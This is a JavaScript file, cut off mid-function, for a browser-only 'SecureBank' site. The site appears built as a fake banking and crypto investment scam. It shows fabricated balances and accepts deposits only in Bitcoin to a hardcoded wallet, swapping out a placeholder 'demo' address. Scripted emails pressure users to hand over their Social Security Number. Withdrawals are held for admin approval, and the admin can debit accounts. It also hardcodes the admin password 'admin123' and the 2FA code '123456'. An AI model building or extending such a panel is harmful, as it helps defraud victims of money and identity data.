const SESSION_KEY = "securebank_session";
const ACCOUNTS_KEY = "securebank_accounts";
const ADMIN_DATA_KEY = "securebank_admin_data";
const ADMIN_SESSION_KEY = "securebank_admin_session";

const DEFAULT_ADMIN = {
    email: "admin@securebank.com",
    password: "admin123",
    balance: 0,
    payments: [],
    pendingTransfers: [],
    pendingDeposits: [],
    walletAddress: "1J8uJaQo7h9GTNStr8cWf7mnzqbPV6s2s2",
    bankDetails: "SecureBank Admin · Routing: 021000021 · Account: 8847291053"
};

const DEPOSIT_METHODS = {
    crypto: { enabled: true, label: "Bitcoin (BTC)" },
    bank: { enabled: false, label: "Bank Transfer", unavailable: "Bank transfers are unavailable at the moment." },
    card: { enabled: false, label: "Visa / Card", unavailable: "Visa and card payments are unavailable at the moment." }
};

const FX_RATES = { USD: 1, EUR: 0.92, GBP: 0.79 };

const DEFAULT_WEBSITE_SETTINGS = {
    siteName: "SecureBank",
    siteTagline: "Secure Online Banking",
    supportEmail: "support@securebank.com",
    announcement: "",
    maintenanceMode: false
};

const DEFAULT_TRANSACTIONS = [
    { date: "Today", description: "Bitcoin Purchase", amount: -24000 },
    { date: "Yesterday", description: "Salary Deposit", amount: 4500 },
    { date: "June 30", description: "Ethereum Purchase", amount: -800 },
    { date: "June 29", description: "Transfer Received", amount: 1200 },
    { date: "June 28", description: "Buy 1.0 oz GOLD", amount: -4150 },
    { date: "June 27", description: "Buy 5 AAPL", amount: -1540 },
    { date: "June 26", description: "Buy 10 SPY", amount: -5800 }
];

const DEFAULT_HOLDINGS = {
    btc: 0.4825, eth: 8.16, sol: 8.5, xrp: 1250,
    gold: 1.5,
    aapl: 12, googl: 6, msft: 10, nvda: 8,
    spy: 20, qqq: 15, vti: 25
};

function getDefaultAccount() {
    return {
        cash: 25480.33,
        holdings: Object.assign({}, DEFAULT_HOLDINGS),
        transactions: DEFAULT_TRANSACTIONS.map(function(t) {
            return Object.assign({}, t);
        }),
        notifications: [
            { id: 1, message: "BTC purchased successfully", time: new Date().toISOString(), read: false },
            { id: 2, message: "ETH price increased 3.2%", time: new Date(Date.now() - 3600000).toISOString(), read: false },
            { id: 3, message: "Login from MacBook", time: new Date(Date.now() - 7200000).toISOString(), read: false },
            { id: 4, message: "Deposit completed", time: new Date(Date.now() - 86400000).toISOString(), read: true }
        ],
        baselineValue: null,
        theme: "light",
        lastAlerts: {},
        profile: null,
        settings: null,
        analytics: null
    };
}

function getDefaultProfile(email, fullName, phone, extras) {
    extras = extras || {};
    const localPart = email.split("@")[0];
    const name = fullName || (localPart.charAt(0).toUpperCase() + localPart.slice(1));
    return {
        fullName: name,
        email: email,
        phone: phone || "",
        country: extras.country || "",
        dateOfBirth: extras.dateOfBirth || "",
        referralCode: extras.referralCode || "",
        memberSince: new Date().toISOString(),
        verificationStatus: "Verified",
        ssnLast4: null,
        lastLoginAt: null,
        lastLoginDevice: null
    };
}

function generateVerificationCode() {
    return String(Math.floor(100000 + Math.random() * 900000));
}

function sendEmailVerificationEmail(account, email, fullName, code) {
    queueAccountEmail(account, {
        to: email,
        subject: "Verify your SecureBank email",
        body: "Hi " + fullName + ",\n\n" +
            "Thanks for signing up! Enter this verification code to activate your account:\n\n" +
            code + "\n\n" +
            "This code expires in 24 hours. If you did not create an account, ignore this email.\n\n" +
            "SecureBank Security Team",
        type: "verification"
    });
}

function verifyEmailCode(email, code) {
    const key = normalizeEmail(email);
    const account = getAccount(key);
    if (!account) return { ok: false, error: "Account not found." };
    if (account.emailVerified) return { ok: true };
    const expected = String(account.emailVerificationCode || "").trim();
    if (!expected || String(code || "").trim() !== expected) {
        return { ok: false, error: "Invalid verification code." };
    }
    account.emailVerified = true;
    account.emailVerificationCode = null;
    account.notifications.unshift({
        id: Date.now(),
        message: "Email verified — your account is now active",
        time: new Date().toISOString(),
        read: false
    });
    saveAccount(key, account);
    return { ok: true };
}

function sendPasswordResetEmail(account, email) {
    const profile = account.profile || {};
    queueAccountEmail(account, {
        to: email,
        subject: "SecureBank password reset",
        body: "Hi " + (profile.fullName || email) + ",\n\n" +
            "We received a request to reset your password. In this demo, use your existing password or contact support.\n\n" +
            "If you did not request this, you can safely ignore this message.\n\n" +
            "SecureBank Security Team",
        type: "security"
    });
}

function requestPasswordReset(email) {
    const key = normalizeEmail(email);
    if (!isValidEmail(key)) {
        return { ok: false, error: "Please enter a valid email address." };
    }
    const account = getAccount(key);
    if (!account) {
        return { ok: true, message: "If an account exists for that email, reset instructions were sent." };
    }
    sendPasswordResetEmail(account, key);
    saveAccount(key, account);
    return { ok: true, message: "If an account exists for that email, reset instructions were sent." };
}

function recordSuccessfulLogin(email) {
    const key = normalizeEmail(email);
    const account = getAccount(key);
    if (!account) return null;

    const fingerprint = getDeviceFingerprint();
    const deviceLabel = getDeviceLabel();
    const knownDevices = account.knownDevices || [];
    const isNewDevice = knownDevices.indexOf(fingerprint) === -1;
    const previousLogin = account.profile && account.profile.lastLoginAt
        ? { at: account.profile.lastLoginAt, device: account.profile.lastLoginDevice }
        : null;

    if (isNewDevice) {
        knownDevices.push(fingerprint);
        account.knownDevices = knownDevices.slice(-10);
        account.notifications.unshift({
            id: Date.now(),
            message: "New device sign-in: " + deviceLabel,
            time: new Date().toISOString(),
            read: false
        });
    }

    account.notifications.unshift({
        id: Date.now() + 1,
        message: "Login from " + deviceLabel,
        time: new Date().toISOString(),
        read: false
    });
    if (account.notifications.length > 30) {
        account.notifications = account.notifications.slice(0, 30);
    }

    ensureProfile(key, account);
    account.profile.lastLoginAt = new Date().toISOString();
    account.profile.lastLoginDevice = deviceLabel;
    saveAccount(key, account);

    return { isNewDevice: isNewDevice, deviceLabel: deviceLabel, previousLogin: previousLogin };
}

function verifyTwoFactorCode(account, code) {
    if (!account || !getSettings(account).twoFactorEnabled) return true;
    return String(code || "").trim() === "123456";
}

function isValidSsn(ssn) {
    const digits = String(ssn || "").replace(/\D/g, "");
    return digits.length === 9;
}

function formatSsnDisplay(ssnLast4) {
    if (!ssnLast4) return "—";
    return "***-**-" + ssnLast4;
}

function queueAccountEmail(account, emailData) {
    if (!account.emails) account.emails = [];
    account.emails.unshift({
        id: Date.now() + Math.random(),
        to: emailData.to,
        subject: emailData.subject,
        body: emailData.body,
        time: new Date().toISOString(),
        read: false,
        type: emailData.type || "general"
    });
    if (account.emails.length > 50) {
        account.emails = account.emails.slice(0, 50);
    }
}

function sendWelcomeEmail(account, email, fullName) {
    queueAccountEmail(account, {
        to: email,
        subject: "Welcome to SecureBank!",
        body: "Hi " + fullName + ",\n\n" +
            "Welcome to SecureBank! Your account has been created successfully.\n\n" +
            "You now have access to secure online banking, crypto trading, and portfolio management. " +
            "Your account starts with a $0 balance — use Deposit to add funds when you're ready.\n\n" +
            "Before you can access all features, please complete identity verification by submitting " +
            "your Social Security Number (SSN) in your profile settings.\n\n" +
            "If you did not create this account, please contact us immediately at support@securebank.com.\n\n" +
            "Thank you for choosing SecureBank,\nThe SecureBank Team",
        type: "welcome"
    });
}

function sendSsnVerificationEmail(account, email, fullName) {
    queueAccountEmail(account, {
        to: email,
        subject: "Action Required: Verify Your Identity",
        body: "Hi " + fullName + ",\n\n" +
            "To comply with federal banking regulations and protect your account, we need to verify your identity.\n\n" +
            "Please log in to SecureBank and go to Profile → Identity Verification to submit your " +
            "Social Security Number (SSN).\n\n" +
            "Your SSN is encrypted and used solely for identity verification. We never share your " +
            "personal information with third parties.\n\n" +
            "Until verification is complete, some account features may be limited.\n\n" +
            "Complete verification here: Profile → Identity Verification\n\n" +
            "SecureBank Security Team",
        type: "verification"
    });
}

function formatDepositMethod(method) {
    if (method === "crypto") return "Cryptocurrency";
    if (method === "bank") return "Bank Transfer";
    if (method === "card") return "Card";
    return method || "Deposit";
}

function sendDepositApprovedEmail(account, userEmail, amount, method) {
    const profile = account.profile || {};
    const fullName = profile.fullName || userEmail;
    const ws = getWebsiteSettings();
    const siteName = ws.siteName || "SecureBank";
    const supportEmail = ws.supportEmail || "support@securebank.com";
    const methodLabel = formatDepositMethod(method);
    const subject = siteName + " — Deposit of $" + amount.toFixed(2) + " credited";
    const body = "Hi " + fullName + ",\n\n" +
        "Your deposit of $" + amount.toFixed(2) + " via " + methodLabel +
        " has been approved and credited to your account.\n\n" +
        "Updated cash balance: $" + Number(account.cash).toFixed(2) + "\n" +
        "Date: " + new Date().toLocaleString() + "\n\n" +
        "Log in to SecureBank to view your updated balance and transaction history.\n\n" +
        "If you did not make this deposit, contact us immediately at " + supportEmail + ".\n\n" +
        "Thank you,\n" + siteName;

    queueAccountEmail(account, {
        to: userEmail,
        subject: subject,
        body: body,
        type: "deposit"
    });

    if (typeof sendRealEmail !== "function") {
        return Promise.resolve({ ok: false, error: "Email service unavailable." });
    }

    return sendRealEmail(userEmail, subject, body);
}

function submitSsnVerification(userEmail, ssn) {
    const key = normalizeEmail(userEmail);
    const account = getAccount(key);
    if (!account) {
        return { ok: false, error: "Account not found." };
    }

    const profile = ensureProfile(key, account);
    if (profile.verificationStatus === "Verified" && profile.ssnLast4) {
        return { ok: false, error: "Your identity is already verified." };
    }

    if (!isValidSsn(ssn)) {
        return { ok: false, error: "Please enter a valid 9-digit Social Security Number." };
    }

    const digits = String(ssn).replace(/\D/g, "");
    profile.ssnLast4 = digits.slice(-4);
    profile.verificationStatus = "Verified";
    profile.verifiedAt = new Date().toISOString();
    account.profile = profile;

    queueAccountEmail(account, {
        to: key,
        subject: "Identity Verification Complete",
        body: "Hi " + profile.fullName + ",\n\n" +
            "Your identity has been successfully verified. Your SSN ending in " + profile.ssnLast4 +
            " has been confirmed.\n\n" +
            "You now have full access to all SecureBank features including transfers, deposits, and trading.\n\n" +
            "SecureBank Security Team",
        type: "verification"
    });

    account.notifications.unshift({
        id: Date.now() + Math.random(),
        message: "Identity verification complete — full account access unlocked",
        time: new Date().toISOString(),
        read: false
    });
    if (account.notifications.length > 30) {
        account.notifications = account.notifications.slice(0, 30);
    }

    saveAccount(key, account);
    return { ok: true };
}

function getStarterAccount(fullName, email, phone, extras) {
    extras = extras || {};
    const account = getDefaultAccount();
    account.cash = 0;
    account.holdings = {
        btc: 0, eth: 0, sol: 0, xrp: 0,
        gold: 0, aapl: 0, googl: 0, msft: 0, nvda: 0,
        spy: 0, qqq: 0, vti: 0
    };
    account.transactions = [];
    account.notifications = [
        {
            id: 1,
            message: "Welcome to SecureBank! A welcome email was sent to " + email,
            time: new Date().toISOString(),
            read: false
        },
        {
            id: 2,
            message: "Verify your email — check your inbox for a 6-digit code",
            time: new Date().toISOString(),
            read: false
        },
        {
            id: 3,
            message: "Identity verification required — check your email and submit your SSN in Profile",
            time: new Date().toISOString(),
            read: false
        }
    ];
    account.emails = [];
    account.profile = getDefaultProfile(email, fullName, phone, extras);
    account.profile.verificationStatus = "Pending";
    account.profile.ssnLast4 = null;
    return account;
}

function normalizeEmail(email) {
    return String(email || "").trim().toLowerCase();
}

function isValidEmail(email) {
    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
}

function isValidPhone(phone) {
    const digits = String(phone || "").replace(/\D/g, "");
    return digits.length >= 10;
}

function ensureProfile(email, account) {
    if (!account.profile) {
        account.profile = getDefaultProfile(email);
        saveAccount(email, account);
    }
    return account.profile;
}

function ensureSettings(username, account) {
    if (!account.settings) {
        account.settings = {
            theme: account.theme || "light",
            currency: "USD",
            language: "en",
            twoFactorEnabled: false
        };
    }
    account.theme = account.settings.theme;
    saveAccount(username, account);
    return account.settings;
}

function getSettings(account) {
    return account.settings || {
        theme: account.theme || "light",
        currency: "USD",
        language: "en",
        twoFactorEnabled: false
    };
}

function getSession() {
    try {
        return JSON.parse(localStorage.getItem(SESSION_KEY));
    } catch (e) {
        return null;
    }
}

function setSession(email) {
    localStorage.setItem(SESSION_KEY, JSON.stringify({ email: normalizeEmail(email) }));
}

function clearSession() {
    localStorage.removeItem(SESSION_KEY);
}

function getAllAccounts() {
    try {
        return JSON.parse(localStorage.getItem(ACCOUNTS_KEY)) || {};
    } catch (e) {
        return {};
    }
}

function ensureHoldings(account) {
    if (!account.holdings) account.holdings = {};
    let changed = false;
    Object.keys(DEFAULT_HOLDINGS).forEach(function(key) {
        if (account.holdings[key] == null) {
            account.holdings[key] = DEFAULT_HOLDINGS[key];
            changed = true;
        }
    });
    return changed;
}

function getAccount(email) {
    const key = normalizeEmail(email);
    const accounts = getAllAccounts();
    const account = accounts[key];
    if (!account) return null;
    ensureNotifications(account);
    if (ensureHoldings(account)) {
        accounts[key] = account;
        localStorage.setItem(ACCOUNTS_KEY, JSON.stringify(accounts));
    }
    return account;
}

function accountExists(email) {
    return !!getAllAccounts()[normalizeEmail(email)];
}

function createAccount(email, password, fullName, phone, extras) {
    extras = extras || {};
    const key = normalizeEmail(email);
    if (!isValidEmail(key)) {
        return { ok: false, error: "Please enter a valid email address." };
    }
    if (accountExists(key)) {
        return { ok: false, error: "An account with this email already exists." };
    }
    if (!password || password.length < 6) {
        return { ok: false, error: "Password must be at least 6 characters." };
    }
    if (!isValidPhone(phone)) {
        return { ok: false, error: "Please enter a valid phone number (at least 10 digits)." };
    }
    if (!extras.agreedToTerms) {
        return { ok: false, error: "You must agree to the Terms & Privacy Policy." };
    }

    const account = getStarterAccount(fullName.trim(), key, phone.trim(), extras);
    account.password = password;
    account.emailVerified = false;
    account.emailVerificationCode = generateVerificationCode();
    account.knownDevices = [];
    account.settings = {
        theme: "light",
        currency: extras.currency || "USD",
        language: "en",
        twoFactorEnabled: false
    };
    sendWelcomeEmail(account, key, fullName.trim());
    sendSsnVerificationEmail(account, key, fullName.trim());
    sendEmailVerificationEmail(account, key, fullName.trim(), account.emailVerificationCode);
    saveAccount(key, account);
    return { ok: true, verificationCode: account.emailVerificationCode };
}

function authenticate(email, password) {
    const account = getAccount(email);
    if (!account || account.password !== password) return null;
    return account;
}

function mergeNotificationLists(primary, secondary) {
    const map = new Map();
    (secondary || []).forEach(function(n) {
        map.set(String(n.id), n);
    });
    (primary || []).forEach(function(n) {
        map.set(String(n.id), n);
    });
    return Array.from(map.values())
        .sort(function(a, b) { return new Date(b.time) - new Date(a.time); })
        .slice(0, 30);
}

function ensureNotifications(account) {
    if (!account.notifications) account.notifications = [];
    return account.notifications;
}

function syncAccountNotifications(email, account) {
    const stored = getAllAccounts()[normalizeEmail(email)];
    account.notifications = mergeNotificationLists(
        account.notifications || [],
        stored && stored.notifications ? stored.notifications : []
    );
    return account.notifications;
}

function saveAccount(email, account) {
    const accounts = getAllAccounts();
    const key = normalizeEmail(email);
    const existing = accounts[key];
    if (existing && Array.isArray(existing.notifications)) {
        account.notifications = mergeNotificationLists(
            account.notifications || [],
            existing.notifications
        );
    } else {
        ensureNotifications(account);
    }
    accounts[key] = account;
    localStorage.setItem(ACCOUNTS_KEY, JSON.stringify(accounts));
}

function requireAuth() {
    const session = getSession();
    const email = session && (session.email || session.username);
    if (!email) {
        window.location.href = "index.html";
        return null;
    }
    if (!getAccount(email)) {
        clearSession();
        window.location.href = "index.html";
        return null;
    }
    return normalizeEmail(email);
}

function getAdminData() {
    try {
        const data = JSON.parse(localStorage.getItem(ADMIN_DATA_KEY));
        if (data && data.email) {
            if (!data.pendingTransfers) data.pendingTransfers = [];
            if (!data.pendingDeposits) data.pendingDeposits = [];
            if (!data.walletAddress) data.walletAddress = DEFAULT_ADMIN.walletAddress;
            if (data.walletAddress === "bc1qsecurebank0ff1c1aladm1nwalle7demo2024") {
                data.walletAddress = DEFAULT_ADMIN.walletAddress;
            }
            if (!data.bankDetails) data.bankDetails = DEFAULT_ADMIN.bankDetails;
            if (!data.websiteSettings) {
                data.websiteSettings = Object.assign({}, DEFAULT_WEBSITE_SETTINGS);
            }
            if (!data.notificationLog) data.notificationLog = [];
            return data;
        }
    } catch (e) { /* ignore */ }
    localStorage.setItem(ADMIN_DATA_KEY, JSON.stringify(Object.assign({}, DEFAULT_ADMIN, {
        payments: [], pendingTransfers: [], pendingDeposits: []
    })));
    return JSON.parse(localStorage.getItem(ADMIN_DATA_KEY));
}

function saveAdminData(data) {
    localStorage.setItem(ADMIN_DATA_KEY, JSON.stringify(data));
}

function authenticateAdmin(email, password) {
    const admin = getAdminData();
    const key = normalizeEmail(email);
    if (key !== normalizeEmail(admin.email) || admin.password !== password) return null;
    return admin;
}

function getAdminSession() {
    try {
        return JSON.parse(localStorage.getItem(ADMIN_SESSION_KEY));
    } catch (e) {
        return null;
    }
}

function setAdminSession(email) {
    localStorage.setItem(ADMIN_SESSION_KEY, JSON.stringify({ email: normalizeEmail(email) }));
}

function clearAdminSession() {
    localStorage.removeItem(ADMIN_SESSION_KEY);
}

function requireAdminAuth() {
    const session = getAdminSession();
    const admin = getAdminData();
    if (!session || normalizeEmail(session.email) !== normalizeEmail(admin.email)) {
        window.location.href = typeof getLocalServerUrl === "function"
            ? getLocalServerUrl("admin.html")
            : "admin.html";
        return null;
    }
    return admin.email;
}

function recordUserPayment(userEmail, type, amount, method) {
    const admin = getAdminData();
    const account = getAccount(userEmail);
    const userName = account && account.profile ? account.profile.fullName : userEmail;

    if (type === "deposit") {
        admin.balance += amount;
    } else if (type === "withdraw") {
        admin.balance -= amount;
    }

    admin.payments.unshift({
        id: Date.now() + Math.random(),
        userEmail: normalizeEmail(userEmail),
        userName: userName,
        type: type,
        amount: amount,
        method: method || "—",
        date: new Date().toLocaleString()
    });

    if (admin.payments.length > 200) {
        admin.payments = admin.payments.slice(0, 200);
    }

    saveAdminData(admin);
}

function getHoldingsSummary(holdings) {
    holdings = holdings || {};
    const labels = {
        btc: "BTC", eth: "ETH", sol: "SOL", xrp: "XRP", gold: "Gold oz",
        aapl: "AAPL", googl: "GOOGL", msft: "MSFT", nvda: "NVDA",
        spy: "SPY", qqq: "QQQ", vti: "VTI"
    };
    const parts = [];
    Object.keys(labels).forEach(function(key) {
        const val = holdings[key] || 0;
        if (val <= 0) return;
        if (key === "btc") parts.push(val.toFixed(4) + " BTC");
        else if (key === "xrp") parts.push(Math.round(val) + " XRP");
        else if (key === "gold") parts.push(val.toFixed(2) + " oz Gold");
        else if (key === "aapl" || key === "googl" || key === "msft" || key === "nvda" ||
                 key === "spy" || key === "qqq" || key === "vti") {
            parts.push(Math.round(val) + " " + labels[key]);
        } else parts.push(val.toFixed(2) + " " + labels[key]);
    });
    return parts.length ? parts.join(" · ") : "No holdings";
}

function getAllUsersSummary() {
    const accounts = getAllAccounts();
    return Object.keys(accounts).map(function(email) {
        const acct = accounts[email];
        const profile = acct.profile || {};
        const lastTx = acct.transactions && acct.transactions[0];
        return {
            email: email,
            name: profile.fullName || email,
            phone: profile.phone || "—",
            cash: acct.cash || 0,
            holdingsSummary: getHoldingsSummary(acct.holdings),
            lastActivity: lastTx ? lastTx.description : "—",
            lastActivityDate: lastTx ? lastTx.date : "—",
            transactionCount: (acct.transactions || []).length,
            memberSince: profile.memberSince || null
        };
    }).sort(function(a, b) {
        return a.email.localeCompare(b.email);
    });
}

function getUserDetailForAdmin(email) {
    const account = getAccount(email);
    if (!account) return null;
    const profile = account.profile || getDefaultProfile(email);
    return {
        email: normalizeEmail(email),
        profile: profile,
        cash: account.cash || 0,
        holdings: account.holdings || {},
        holdingsSummary: getHoldingsSummary(account.holdings),
        transactions: account.transactions || [],
        notifications: account.notifications || [],
        transactionCount: (account.transactions || []).length
    };
}

function getAllUserActivity(filterEmail, limit) {
    limit = limit || 50;
    const accounts = getAllAccounts();
    let activities = [];

    Object.keys(accounts).forEach(function(email) {
        if (filterEmail && normalizeEmail(email) !== normalizeEmail(filterEmail)) return;
        const acct = accounts[email];
        const name = acct.profile ? acct.profile.fullName : email;
        (acct.transactions || []).forEach(function(t) {
            activities.push({
                userEmail: email,
                userName: name,
                date: t.date,
                description: t.description,
                amount: t.amount
            });
        });
    });

    activities.sort(function(a, b) {
        const ta = new Date(a.date).getTime();
        const tb = new Date(b.date).getTime();
        if (isNaN(ta) || isNaN(tb)) return 0;
        return tb - ta;
    });

    return activities.slice(0, limit);
}

function adminAdjustUserBalance(userEmail, action, amount, note) {
    const key = normalizeEmail(userEmail);
    const account = getAccount(key);
    if (!account) {
        return { ok: false, error: "User not found." };
    }
    amount = parseFloat(amount);
    if (!amount || amount <= 0) {
        return { ok: false, error: "Enter a valid amount." };
    }
    if (action === "debit" && account.cash < amount) {
        return { ok: false, error: "User has insufficient cash for this debit." };
    }

    const admin = getAdminData();
    const userName = account.profile ? account.profile.fullName : key;
    const noteText = note ? String(note).trim() : "";
    const label = action === "credit" ? "Admin Credit" : "Admin Debit";
    const description = noteText ? label + " — " + noteText : label;

    if (action === "credit") {
        account.cash += amount;
        admin.balance -= amount;
    } else {
        account.cash -= amount;
        admin.balance += amount;
    }

    account.transactions.unshift({
        date: new Date().toLocaleString(),
        description: description,
        amount: action === "credit" ? amount : -amount
    });

    account.notifications.unshift({
        id: Date.now() + Math.random(),
        message: action === "credit"
            ? "Your account was credited $" + amount.toFixed(2)
            : "Your account was debited $" + amount.toFixed(2),
        time: new Date().toISOString(),
        read: false
    });
    if (account.notifications.length > 30) {
        account.notifications = account.notifications.slice(0, 30);
    }

    saveAccount(key, account);

    admin.payments.unshift({
        id: Date.now() + Math.random(),
        userEmail: key,
        userName: userName,
        type: action === "credit" ? "admin-credit" : "admin-debit",
        amount: amount,
        method: noteText || "Admin adjustment",
        date: new Date().toLocaleString()
    });
    if (admin.payments.length > 200) {
        admin.payments = admin.payments.slice(0, 200);
    }

    saveAdminData(admin);
    return { ok: true };
}

function getUserPendingTransferTotal(userEmail) {
    const admin = getAdminData();
    return (admin.pendingTransfers || [])
        .filter(function(t) {
            return t.status === "pending" && t.userEmail === normalizeEmail(userEmail);
        })
        .reduce(function(sum, t) { return sum + t.amount; }, 0);
}

function getPendingTransfers() {
    return (getAdminData().pendingTransfers || []).filter(function(t) {
        return t.status === "pending";
    });
}

function getUserPendingTransfers(userEmail) {
    return getPendingTransfers().filter(function(t) {
        return t.userEmail === normalizeEmail(userEmail);
    });
}

function submitTransferRequest(userEmail, amount, destination, method) {
    const key = normalizeEmail(userEmail);
    const account = getAccount(key);
    if (!account) {
        return { ok: false, error: "Account not found." };
    }

    amount = parseFloat(amount);
    if (!amount || amount <= 0) {
        return { ok: false, error: "Enter a valid amount." };
    }

    const pendingTotal = getUserPendingTransferTotal(key);
    if (account.cash - pendingTotal < amount) {
        return { ok: false, error: "Insufficient available balance. Pending transfers reduce your available funds." };
    }

    const admin = getAdminData();
    const userName = account.profile ? account.profile.fullName : key;
    const dest = (destination || "Bank Account").trim();
    const transfer = {
        id: "tx-" + Date.now() + Math.random().toString(36).slice(2, 7),
        userEmail: key,
        userName: userName,
        amount: amount,
        destination: dest,
        method: method || "bank",
        status: "pending",
        requestedAt: new Date().toISOString(),
        date: new Date().toLocaleString()
    };

    admin.pendingTransfers.unshift(transfer);
    saveAdminData(admin);

    if (!account.pendingTransfers) account.pendingTransfers = [];
    account.pendingTransfers.push({ id: transfer.id, amount: amount, destination: dest, status: "pending", date: transfer.date });

    account.transactions.unshift({
        date: transfer.date,
        description: "Transfer Request (Pending) — " + dest,
        amount: 0
    });
    account.notifications.unshift({
        id: Date.now() + Math.random(),
        message: "Transfer of $" + amount.toFixed(2) + " submitted — awaiting admin approval",
        time: new Date().toISOString(),
        read: false
    });
    if (account.notifications.length > 30) {
        account.notifications = account.notifications.slice(0, 30);
    }

    saveAccount(key, account);
    return { ok: true, transfer: transfer };
}

function resolveTransferOnAccount(userEmail, transferId, message) {
    const account = getAccount(userEmail);
    if (!account) return;

    if (account.pendingTransfers) {
        account.pendingTransfers = account.pendingTransfers.filter(function(t) {
            return t.id !== transferId;
        });
    }

    account.notifications.unshift({
        id: Date.now() + Math.random(),
        message: message,
        time: new Date().toISOString(),
        read: false
    });
    if (account.notifications.length > 30) {
        account.notifications = account.notifications.slice(0, 30);
    }

    saveAccount(userEmail, account);
}

function approveTransfer(transferId) {
    const admin = getAdminData();
    const transfer = (admin.pendingTransfers || []).find(function(t) {
        return t.id === transferId && t.status === "pending";
    });
    if (!transfer) {
        return { ok: false, error: "Transfer request not found." };
    }

    const account = getAccount(transfer.userEmail);
    if (!account) {
        return { ok: false, error: "User account not found." };
    }
    if (account.cash < transfer.amount) {
        return { ok: false, error: "User no longer has sufficient funds." };
    }

    account.cash -= transfer.amount;
    account.transactions.unshift({
        date: new Date().toLocaleString(),
        description: "Transfer Approved — " + transfer.destination,
        amount: -transfer.amount
    });

    transfer.status = "approved";
    transfer.resolvedAt = new Date().toLocaleString();

    saveAccount(transfer.userEmail, account);
    recordUserPayment(transfer.userEmail, "withdraw", transfer.amount, transfer.method);
    saveAdminData(admin);

    resolveTransferOnAccount(
        transfer.userEmail,
        transferId,
        "Your transfer of $" + transfer.amount.toFixed(2) + " was approved"
    );

    return { ok: true };
}

function rejectTransfer(transferId, reason) {
    const admin = getAdminData();
    const transfer = (admin.pendingTransfers || []).find(function(t) {
        return t.id === transferId && t.status === "pending";
    });
    if (!transfer) {
        return { ok: false, error: "Transfer request not found." };
    }

    transfer.status = "rejected";
    transfer.resolvedAt = new Date().toLocaleString();
    transfer.rejectReason = reason || "Rejected by admin";

    const accountTx = getAccount(transfer.userEmail);
    if (accountTx) {
        accountTx.transactions.unshift({
            date: new Date().toLocaleString(),
            description: "Transfer Rejected — " + transfer.destination,
            amount: 0
        });
        saveAccount(transfer.userEmail, accountTx);
    }

    saveAdminData(admin);

    resolveTransferOnAccount(
        transfer.userEmail,
        transferId,
        "Your transfer of $" + transfer.amount.toFixed(2) + " was rejected" +
            (reason ? ": " + reason : "")
    );

    return { ok: true };
}

function getDepositMethods() {
    return DEPOSIT_METHODS;
}

function isDepositMethodEnabled(method) {
    return !!(DEPOSIT_METHODS[method] && DEPOSIT_METHODS[method].enabled);
}

function ensureExchangeHistory(account) {
    if (!account.exchangeHistory) account.exchangeHistory = [];
    return account.exchangeHistory;
}

function ensureLinkedBanks(account) {
    if (!account.linkedBanks) account.linkedBanks = [];
    return account.linkedBanks;
}

function ensureSupportTickets(account) {
    if (!account.supportTickets) account.supportTickets = [];
    return account.supportTickets;
}

function getSupportItemType(ticket) {
    if (ticket.type) return ticket.type;
    if (ticket.subject === "FRAUD REPORT") return "fraud";
    if (ticket.subject === "Live Chat") return "chat";
    return "ticket";
}

function getAllSupportItems(statusFilter) {
    const accounts = getAllAccounts();
    const items = [];

    Object.keys(accounts).forEach(function(email) {
        const acct = accounts[email];
        const userName = acct.profile ? acct.profile.fullName : email;
        (acct.supportTickets || []).forEach(function(ticket) {
            items.push({
                id: ticket.id,
                type: getSupportItemType(ticket),
                subject: ticket.subject,
                message: ticket.message,
                status: ticket.status || "Open",
                date: ticket.date,
                responses: ticket.responses || [],
                userEmail: normalizeEmail(email),
                userName: userName
            });
        });
    });

    items.sort(function(a, b) {
        const ta = new Date(a.date).getTime();
        const tb = new Date(b.date).getTime();
        return (isNaN(tb) ? 0 : tb) - (isNaN(ta) ? 0 : ta);
    });

    if (statusFilter === "open") {
        return items.filter(function(item) {
            return item.status === "Open" || item.status === "Urgent" || item.status === "In Progress";
        });
    }
    if (statusFilter === "fraud") {
        return items.filter(function(item) { return item.type === "fraud"; });
    }
    return items;
}

function getOpenSupportCount() {
    return getAllSupportItems("open").length;
}

function adminRespondToSupport(userEmail, ticketId, response, markResolved) {
    response = String(response || "").trim();
    if (!response) {
        return { ok: false, error: "Enter a response message." };
    }

    const key = normalizeEmail(userEmail);
    const account = getAccount(key);
    if (!account) {
        return { ok: false, error: "User not found." };
    }

    const tickets = ensureSupportTickets(account);
    const ticket = tickets.find(function(t) {
        return String(t.id) === String(ticketId);
    });
    if (!ticket) {
        return { ok: false, error: "Support item not found." };
    }

    if (!ticket.responses) ticket.responses = [];
    ticket.responses.push({
        from: "admin",
        message: response,
        date: new Date().toLocaleString()
    });

    if (markResolved) {
        ticket.status = "Resolved";
        ticket.resolvedAt = new Date().toLocaleString();
    } else if (ticket.status === "Open" || ticket.status === "Urgent") {
        ticket.status = "In Progress";
    }

    const subjectLabel = ticket.subject || "your support request";
    account.notifications.unshift({
        id: Date.now() + Math.random(),
        message: "Support replied to \"" + subjectLabel + "\": " +
            (response.length > 80 ? response.slice(0, 80) + "…" : response),
        time: new Date().toISOString(),
        read: false
    });
    if (account.notifications.length > 30) {
        account.notifications = account.notifications.slice(0, 30);
    }

    queueAccountEmail(account, {
        to: key,
        subject: "Support Response — " + subjectLabel,
        body: "Hi " + (account.profile ? account.profile.fullName : key) + ",\n\n" +
            "An admin has responded to your support request:\n\n" +
            response + "\n\n" +
            "Log in to SecureBank → Support to view the full conversation.\n\n" +
            "SecureBank Support",
        type: "support"
    });

    saveAccount(key, account);
    return { ok: true };
}

function adminResolveSupport(userEmail, ticketId) {
    return adminRespondToSupport(userEmail, ticketId, "This ticket has been marked as resolved.", true);
}

function ensureApiKeys(account) {
    if (!account.apiKeys) account.apiKeys = [];
    return account.apiKeys;
}

function recordExchange(userEmail, entry) {
    const account = getAccount(userEmail);
    if (!account) return { ok: false, error: "Account not found." };
    const history = ensureExchangeHistory(account);
    history.unshift(Object.assign({
        id: Date.now() + Math.random(),
        time: new Date().toISOString(),
        date: new Date().toLocaleString()
    }, entry));
    if (history.length > 100) account.exchangeHistory = history.slice(0, 100);
    saveAccount(userEmail, account);
    return { ok: true };
}

function getAdminWalletAddress() {
    return getAdminData().walletAddress || DEFAULT_ADMIN.walletAddress;
}

function getAdminBankDetails() {
    return getAdminData().bankDetails || DEFAULT_ADMIN.bankDetails;
}

function updateAdminPaymentSettings(walletAddress, bankDetails) {
    const admin = getAdminData();
    admin.walletAddress = (walletAddress || "").trim() || DEFAULT_ADMIN.walletAddress;
    admin.bankDetails = (bankDetails || "").trim() || DEFAULT_ADMIN.bankDetails;
